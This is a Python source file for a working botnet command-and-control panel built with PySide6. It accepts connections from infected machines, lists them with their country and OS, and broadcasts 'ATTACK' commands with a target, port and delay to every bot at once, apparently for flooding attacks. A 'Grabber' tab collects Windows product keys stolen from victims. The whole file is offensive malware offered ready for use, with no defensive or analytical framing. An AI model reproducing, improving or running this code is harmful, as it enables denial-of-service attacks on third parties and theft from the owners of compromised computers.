import sys
import socket
import threading
import time
import requests
import logging
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QTableWidget, QTableWidgetItem,
    QVBoxLayout, QWidget, QPushButton, QLabel, QLineEdit, QTabWidget
)

# Setup logging
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("cnc_server.log"),
        logging.StreamHandler()
    ]
)

class CnCServer(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("C&C Server")
        self.setGeometry(100, 100, 800, 600)

        # Tabs
        self.tabs = QTabWidget()
        self.menu_tab = QWidget()
        self.grabber_tab = QWidget()
        self.tabs.addTab(self.menu_tab, "Menu")
        self.tabs.addTab(self.grabber_tab, "Grabber")
        self.setCentralWidget(self.tabs)

        self.bots_table = None
        self.grabber_table = None
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bots = {}  # Dictionary to store bot info (IP, status, country, OS)

        self.setup_menu_tab()
        self.setup_grabber_tab()
        threading.Thread(target=self.start_server).start()

    def setup_menu_tab(self):
        layout = QVBoxLayout()
        self.menu_tab.setLayout(layout)

        # Table for bots
        self.bots_table = QTableWidget(0, 4)
        self.bots_table.setHorizontalHeaderLabels(
            ["Bots Online", "Status", "Country", "OS"]
        )
        layout.addWidget(self.bots_table)

        # Form for attack parameters
        self.target_label = QLabel("Target:")
        self.target_input = QLineEdit()
        self.port_label = QLabel("Port:")
        self.port_input = QLineEdit("80")
        self.delay_label = QLabel("Delay:")
        self.delay_input = QLineEdit("0")

        layout.addWidget(self.target_label)
        layout.addWidget(self.target_input)
        layout.addWidget(self.port_label)
        layout.addWidget(self.port_input)
        layout.addWidget(self.delay_label)
        layout.addWidget(self.delay_input)

        # Buttons
        self.start_button = QPushButton("Start Attack")
        self.stop_button = QPushButton("Stop Attack")
        layout.addWidget(self.start_button)
        layout.addWidget(self.stop_button)

        self.start_button.clicked.connect(self.start_attack)
        self.stop_button.clicked.connect(self.stop_attack)

    def setup_grabber_tab(self):
        layout = QVBoxLayout()
        self.grabber_tab.setLayout(layout)

        # Table for grabber
        self.grabber_table = QTableWidget(0, 2)
        self.grabber_table.setHorizontalHeaderLabels(["Windows Key", "Bot"])
        layout.addWidget(self.grabber_table)

    def start_server(self):
        try:
            self.server_socket.bind(("0.0.0.0", 12345))
            self.server_socket.listen(5)
            logging.info("C&C server started on port 12345")
            while True:
                client_socket, client_address = self.server_socket.accept()
                logging.info(f"Bot connected: {client_address}")
                threading.Thread(target=self.handle_bot, args=(client_socket, client_address)).start()
        except Exception as e:
            logging.error(f"Error starting server: {e}")

    def handle_bot(self, client_socket, client_address):
        ip = client_address[0]
        self.add_bot(ip, client_socket)

        try:
            while True:
                message = client_socket.recv(1024).decode()
                logging.debug(f"Message from {ip}: {message}")
                if message == "PONG":
                    self.update_bot_status(ip, "Idle")
                elif message.startswith("OS:"):
                    os_info = message.split(":", 1)[1]
                    self.update_bot_os(ip, os_info)
                elif message.startswith("KEY:"):
                    windows_key = message.split(":", 1)[1]
                    self.add_to_grabber_table(windows_key, ip)
        except socket.error:
            logging.warning(f"Bot {ip} disconnected")
            self.remove_bot(ip)

    def add_bot(self, ip, client_socket):
        row_position = self.bots_table.rowCount()
        self.bots_table.insertRow(row_position)

        self.bots_table.setItem(row_position, 0, QTableWidgetItem(ip))
        self.bots_table.setItem(row_position, 1, QTableWidgetItem("Waiting for pong..."))
        self.bots_table.setItem(row_position, 2, QTableWidgetItem(self.get_country(ip)))
        self.bots_table.setItem(row_position, 3, QTableWidgetItem("Unknown"))

        self.bots[ip] = {"row": row_position, "socket": client_socket, "status": "Waiting for pong..."}
        logging.info(f"Bot {ip} added to the table")
        threading.Thread(target=self.ping_bot, args=(ip, client_socket)).start()

    def remove_bot(self, ip):
        if ip in self.bots:
            row = self.bots[ip]["row"]
            self.bots_table.removeRow(row)
            del self.bots[ip]
            logging.info(f"Bot {ip} removed from the table")

    def update_bot_status(self, ip, status):
        if ip in self.bots:
            row = self.bots[ip]["row"]
            self.bots_table.setItem(row, 1, QTableWidgetItem(status))
            self.bots[ip]["status"] = status
            logging.info(f"Status of {ip} updated to {status}")

    def update_bot_os(self, ip, os_info):
        if ip in self.bots:
            row = self.bots[ip]["row"]
            self.bots_table.setItem(row, 3, QTableWidgetItem(os_info))
            logging.info(f"OS of {ip} updated to {os_info}")

    def ping_bot(self, ip, client_socket):
        while True:
            try:
                client_socket.sendall("PING".encode())
                time.sleep(10)
                if self.bots[ip]["status"] == "Waiting for pong...":
                    logging.warning(f"Bot {ip} did not respond to ping, removing from table")
                    self.remove_bot(ip)
                    break
            except socket.error:
                logging.error(f"Error pinging bot {ip}, removing from table")
                self.remove_bot(ip)
                break

    def get_country(self, ip):
        try:
            response = requests.get(f"http://ipinfo.io/{ip}/country")
            if response.ok:
                country = response.text.strip()
                logging.info(f"Country for {ip}: {country}")
                return country
            else:
                logging.warning(f"Failed to get country for {ip}")
                return "Unknown"
        except Exception as e:
            logging.error(f"Error getting country for {ip}: {e}")
            return "Unknown"

    def start_attack(self):
        target = self.target_input.text()
        port = self.port_input.text()
        delay = self.delay_input.text()

        for ip, bot in self.bots.items():
            try:
                command = f"ATTACK {target} {port} {delay}"
                bot["socket"].sendall(command.encode())
                self.update_bot_status(ip, "Attacking")
                logging.info(f"Attack command sent to {ip} with target {target}:{port}, delay {delay}")
            except socket.error:
                logging.error(f"Failed to send attack command to {ip}")
                self.remove_bot(ip)

    def stop_attack(self):
        for ip, bot in self.bots.items():
            try:
                bot["socket"].sendall("STOP".encode())
                self.update_bot_status(ip, "Idle")
                logging.info(f"Stop command sent to {ip}")
            except socket.error:
                logging.error(f"Failed to send stop command to {ip}")
                self.remove_bot(ip)

    def add_to_grabber_table(self, windows_key, ip):
        row_position = self.grabber_table.rowCount()
        self.grabber_table.insertRow(row_position)

        self.grabber_table.setItem(row_position, 0, QTableWidgetItem(windows_key))
        self.grabber_table.setItem(row_position, 1, QTableWidgetItem(ip))
        logging.info(f"Windows key {windows_key} added to grabber table for bot {ip}")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = CnCServer()
    window.show()
    sys.exit(app.exec())
